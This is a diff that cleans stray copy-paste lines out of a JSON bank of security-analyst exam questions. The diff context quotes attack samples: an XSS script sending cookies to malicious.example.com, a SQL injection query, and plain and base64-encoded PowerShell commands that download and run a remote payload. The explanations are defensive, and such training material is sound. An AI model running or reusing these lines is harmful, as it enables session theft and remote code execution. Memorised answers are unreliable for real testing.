@@ -320,7 +320,7 @@ What type of attack is being attempted, and what is the significance of the `%00
 
 ```html
 <script>document.location='http://malicious.example.com/steal.php?cookie='+document.cookie</script>
-Use code with caution.
+ .
 What type of attack is this, and what is the attacker's likely goal?",
 "options":[
 "SQL injection; to extract data from the website's database.",
@@ -534,7 +534,7 @@ GET /vulnerable.php?id=123' UNION SELECT username, password FROM users-- HTTP/1.
 ```
 
 What type of attack was attempted, and what was the attacker's likely goal?",
-Use code with caution.
+ 
 "options":[
 "Cross-site scripting (XSS); to inject malicious scripts into the web application.",
 "SQL injection; to extract usernames and passwords from the users table.",
@@ -589,7 +589,7 @@ This information is invaluable for identifying suspicious processes, analyzing m
 "question": "A company's web application allows users to post comments. An attacker posts a comment containing the following HTML:
 
 <img src='x' onerror='alert(document.cookie)'>
-Use code with caution.
+ .
 Html
 If the application is vulnerable, what type of attack is being attempted, and what is the attacker's likely goal?",
 "options":[
@@ -668,7 +668,7 @@ If the application is vulnerable, what type of attack is being attempted, and wh
 /page.php?id=3
  ...
  /page.php?id=1000
-Use code with caution.
+ .
 What type of activity is MOST likely being attempted, even if no specific vulnerability is yet identified?",
 "options":[
 "Cross-site scripting (XSS)",
@@ -890,7 +890,7 @@ Streamlining incident response workflows (e.g., providing automated playbooks, f
 
     ```powershell
    powershell -exec bypass -c \"IEX (New-Object System.Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')\"
-Use code with caution.
+ .
 JavaScript
 What is this command doing, and why is it a HIGH security risk?",
 "options":[
@@ -910,7 +910,7 @@ What is this command doing, and why is it a HIGH security risk?",
 * .DownloadString('http://malicious.example.com/payload.ps1'): Downloads the content of the specified URL (which is likely a malicious PowerShell script) as a string.
 
 The entire command downloads a PowerShell script from a remote (and likely malicious) URL and *immediately executes it* using `IEX`. This bypasses many security restrictions and allows the attacker to run arbitrary code on the compromised system.",
-Use code with caution.
+ .
 "examTip": "PowerShell commands that download and execute remote scripts using IEX (Invoke-Expression) are extremely dangerous."
 },
 {
@@ -1097,7 +1097,7 @@ Therefore, this command is taking a continuous stream of random data from `/dev/
 
 ```powershell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Enc aABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAIAB3AEMAbABpAGUAbgB0ADsAIAAkAHcAYwBsAGkAZQBuAHQALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAFUAcwBlAHIALQBBAGcAZQBuAHQAIgAsACAAIgBNAE8AWgBJAEwATABBAF8ANQAuADAAIABCAG8AdABuAGUAdAAgAEMAbwBtAHAAbwBuAGUAbgB0ACIAKQA7ACAAJAB3AGMAbABpAGUAbgB0AC4ARABvAHcAbgBsAG8AYQBkAFMAHQByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtcABsAGUALgBjAG8AbQAvAHMAYwByAGkAcAB0AC4AcABzADEAIgApAHwASQBFAFgA
-Use code with caution.
+ .
 Bash
 What is this command doing, and why is it a significant security concern?",
 "options":[
@@ -1128,7 +1128,7 @@ What is this command doing, and why is it a significant security concern?",
       4. Uses `IEX` (Invoke-Expression) to *immediately execute* the downloaded script.
 
   This is a *major security threat*. The command downloads and executes arbitrary code from a remote server, bypassing security restrictions, and potentially giving the attacker full control of the system.",
-Use code with caution.
+ .
 "examTip": "Be extremely suspicious of PowerShell commands that use -EncodedCommand and download/execute content from external sources."
 },
 {
@@ -1432,7 +1432,7 @@ What type of attack is MOST likely being attempted, and what is the attacker try
 Client -> Server: SYN
 Server -> Client: SYN-ACK
 Client -> Server: ACK
-Use code with caution.
+ .
 Followed immediately by numerous packets from the Client to the Server on the same connection with the PSH flag set. What does the PSH flag indicate in this context, and why is it relevant to security analysis?",
 "options":[
 "The PSH flag indicates that the connection is being closed; it is not relevant to security analysis.",
@@ -1576,7 +1576,7 @@ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/bin/sh
  testuser:$6$rounds=656000$voTKJ0yXSOqGk737$Vm7/B/xWj4667sCZu/RUd5r74dD5tX2dGv778867sCZu/RUd5r74dD5tX2dGv778867sCZu/RUd5r74dD5tX2dGv/:18913:0:99999:7:::
-Use code with caution.
+ .
 Which user account in this file should raise the MOST immediate concern from a security perspective, and why?",
 "options": [
 "The daemon account, because it has a UID of 1.",
@@ -1592,7 +1592,7 @@ Which user account in this file should raise the MOST immediate concern from a s
 * Unknown purpose: The name 'testuser' suggests it might be a test account, which are often overlooked and may have weak or default passwords.
 
 The combination of these factors makes `testuser` a prime target for attackers. It's a potential entry point for unauthorized access, and its password might be easily guessed or cracked. It's less about *having* a hash and more about being a non-standard user with a potentially weak password, unlike the service accounts designed to *not* be logged into directly.",
-Use code with caution.
+ .
 "examTip": "Non-system user accounts with passwords in /etc/passwd (or, more accurately, in /etc/shadow) are potential targets for attackers."
 }
 
